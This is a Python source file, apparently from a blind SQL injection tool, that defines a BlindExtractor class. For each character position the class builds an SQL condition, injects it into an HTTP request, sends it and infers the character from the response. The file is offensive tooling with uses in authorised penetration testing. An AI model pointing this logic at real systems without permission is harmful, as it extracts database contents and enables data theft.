"""Concrete extraction orchestration."""

import logging
import time
from collections.abc import Callable

from detection import Detector
from models.attack import ExtractionResult
from models.http import RequestData
from payloads import ConditionBuilder, InjectionPoint, PayloadBuilder
from transport import HttpClient

from .contracts import Extractor, SearchStrategy


logger = logging.getLogger(__name__)


class BlindExtractor(Extractor):
    """Extract one expression by composing the injected framework services."""

    def __init__(
        self,
        *,
        http_client: HttpClient,
        condition_builder: ConditionBuilder,
        payload_builder: PayloadBuilder,
        injection_point: InjectionPoint,
        detector: Detector,
        search_strategy: SearchStrategy,
        base_request: RequestData,
        charset: str,
        max_length: int = 100,
        delay: float = 0.0,
        sleeper: Callable[[float], None] = time.sleep,
    ) -> None:
        if not charset:
            raise ValueError("charset cannot be empty")
        if len(set(charset)) != len(charset):
            raise ValueError("charset cannot contain duplicate characters")
        if max_length < 1:
            raise ValueError("max_length must be positive")
        if delay < 0:
            raise ValueError("delay cannot be negative")
        self._http_client = http_client
        self._condition_builder = condition_builder
        self._payload_builder = payload_builder
        self._injection_point = injection_point
        self._detector = detector
        self._search_strategy = search_strategy
        self._base_request = base_request
        self._charset = charset
        self._max_length = max_length
        self._delay = delay
        self._sleeper = sleeper

    def extract(self, expression: str) -> ExtractionResult:
        """Extract up to ``max_length`` characters from an SQL expression."""
        if not expression.strip():
            raise ValueError("expression cannot be empty")

        characters = []
        complete = True
        for position in range(1, self._max_length + 1):
            logger.debug("Evaluating extraction position %d", position)

            def predicate(value: int, position: int = position) -> bool:
                condition = self._condition_builder.build(
                    expression,
                    position,
                    self._search_strategy.comparison_operator,
                    value,
                )
                payload = self._payload_builder.build(condition)
                request = self._injection_point.inject(self._base_request, payload)
                response = self._http_client.send(request)
                if self._delay:
                    self._sleeper(self._delay)
                result = self._detector.is_true(response)
                logger.debug(
                    "Position %d evaluated candidate ASCII %d: %s",
                    position,
                    value,
                    result,
                )
                return result

            result = self._search_strategy.find(position, self._charset, predicate)
            characters.append(result)
            logger.info(
                "Position %d/%d resolved as %s after %d request(s)",
                position,
                self._max_length,
                result.character if result.character is not None else "<not found>",
                result.attempts,
            )
            if result.character is None:
                complete = False
                break

        value = "".join(result.character or "" for result in characters)
        return ExtractionResult(expression, value, tuple(characters), complete)